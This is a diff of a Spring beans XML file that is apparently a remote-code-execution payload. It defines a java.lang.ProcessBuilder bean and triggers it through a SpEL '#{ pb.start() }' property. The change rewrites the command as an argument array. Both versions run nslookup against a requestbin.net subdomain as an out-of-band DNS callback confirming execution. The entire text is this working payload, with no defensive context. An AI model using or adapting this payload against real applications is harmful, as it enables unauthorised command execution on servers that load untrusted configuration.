@@ -5,7 +5,12 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="nslookup hihi.98a93e0e341154dcf228.d.requestbin.net" />
+     <constructor-arg>
+        <array>
+            <value>nslookup</value>
+            <value>dojackson.98a93e0e341154dcf228.d.requestbin.net</value>
+        </array>
+    </constructor-arg>
      <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
